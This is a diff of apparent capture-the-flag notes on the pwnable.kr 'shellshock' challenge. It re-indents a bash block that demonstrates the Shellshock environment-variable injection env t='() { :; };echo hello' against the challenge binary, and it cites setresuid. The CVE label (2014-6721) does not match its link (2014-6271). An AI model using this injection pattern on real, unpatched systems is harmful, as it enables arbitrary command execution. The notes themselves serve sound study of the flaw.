@@ -1,13 +1,13 @@
 # Pwnable.kr - shellshock
 * [CVE 2014-6721](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271)
     * **shellshock** : Vulnerability in Bash Shell which allows the execution of arbitrary command through environment variable.
-        ```bash
-            $ env t=4 bash -c 'echo $t'
-            4
-            $ env t='() { :; };echo hello' ./shellshock
-            hello
-            shock_me
-        ```
+    ```bash
+        $ env t=4 bash -c 'echo $t'
+        4
+        $ env t='() { :; };echo hello' ./shellshock
+        hello
+        shock_me
+    ```
 * [setresuid, setresgid](https://man7.org/linux/man-pages/man2/setresuid.2.html#:~:text=setresuid()%20sets%20the%20real,saved%20set%2Duser%2DID.)
     ```c
         int setresuid(uid_t ruid, uid_t euid, uid_t suid);  
